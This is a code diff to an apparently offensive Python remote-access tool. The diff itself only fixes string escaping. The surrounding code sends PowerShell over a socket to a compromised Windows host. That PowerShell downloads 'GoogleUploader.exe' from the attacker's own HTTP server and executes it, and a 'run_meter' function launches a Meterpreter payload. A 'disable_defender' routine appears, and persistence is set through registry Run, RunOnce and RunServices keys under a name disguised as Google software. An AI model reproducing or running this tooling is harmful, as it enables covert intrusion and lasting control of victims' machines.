@@ -118,7 +118,7 @@ Invoke-AllChecks"""
 
 
 def download_file(s, link, filename):
-    d = "cd %UserProfile%\Documents\n$url = \"" + link + '''\"
+    d = "cd %UserProfile%\\Documents\n$url = \"" + link + '''\"
     $output = \"'''+filename + """\"
     $start_time = Get-Date
     Invoke-WebRequest -Method Get -Uri $url -OutFile $output
@@ -126,7 +126,7 @@ def download_file(s, link, filename):
     s.send(d)
     print(recv_a(s))
     p("\x1b[1;36m[+]\x1b[0m File downloaded.")
-def exe_file(s, filename, filepath="%UserProfile%\Documents\\"): 
+def exe_file(s, filename, filepath="%UserProfile%\\Documents\\"): 
     p("\x1b[1;36m[+]\x1b[0m Executing file.")
     d = '& \'.\\' + filepath + filename + "'\n"
     s.send(d)
@@ -143,7 +143,7 @@ def disable_defender(s):
 
 def presistence(pfile):
     p("\x1b[1;36m[*]\x1b[0m Adding presistence.")
-    d = """reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v GoogleUploade /t REG_SZ /d "{pfile}"
+    d = f"""reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v GoogleUploade /t REG_SZ /d "{pfile}"
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v GoogleUploader /t REG_SZ /d "{pfile}"
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v GoogleUploader /t REG_SZ /d "{pfile}"
     reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v GoogleUploader /t REG_SZ /d "{pfile}"
@@ -163,7 +163,7 @@ def run_meter(s, filename, lport=9091, lhost=HOST, httpport=8080):
     download_file(s, f"http://{lhost}:{httpport}/GoogleUploader.exe", filename)
     exe_file(s, filename)
     p("\x1b[1;36m[+]\x1b[0m Done.")
-    presistence("%UserProfile%\Documents\\"+filename)
+    presistence("%UserProfile%\\Documents\\"+filename)
 
 
 def hide_cmd(s):
